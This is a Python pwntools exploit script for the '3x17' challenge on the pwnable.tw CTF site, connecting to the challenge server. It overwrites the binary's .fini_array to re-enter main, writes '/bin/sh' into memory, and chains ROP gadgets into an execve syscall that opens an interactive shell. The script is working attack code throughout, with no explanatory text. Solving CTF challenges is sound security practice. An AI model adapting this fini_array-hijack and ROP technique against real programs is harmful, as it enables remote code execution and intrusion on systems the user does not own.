#!/usr/bin/env python3

from pwn import *

exe = ELF('3x17', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x4B40F0

        ''')
        input()


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10105)
else:
    p = process([exe.path])
GDB()

def main_excute(addr, data):
    sa(b'addr:', str(addr))
    sa(b'data:', data)

syscall = 0x00000000004022b4
pop_rax = 0x000000000041e4af
pop_rdi = 0x0000000000401696
pop_rsi = 0x0000000000406c30
pop_rdx = 0x0000000000446e35
binsh_addr = 0x4b4000

fini_array = 0x00000000004b40f0
fini_array_excute = 0x402960
main_addr = 0x401B6D
ret_addr = 0x401C4B

main_excute(fini_array, p64(fini_array_excute) + p64(main_addr))
main_excute(binsh_addr, b'/bin/sh\x00')
main_excute(fini_array + 2*8, p64(pop_rdi) + p64(binsh_addr))
main_excute(fini_array + 4*8, p64(pop_rsi) + p64(0))
main_excute(fini_array + 6*8, p64(pop_rdx) + p64(0))
main_excute(fini_array + 8*8, p64(pop_rax) + p64(0x3b))
main_excute(fini_array + 10*8, p64(syscall) + p64(0))
main_excute(fini_array, p64(ret_addr))

p.interactive()
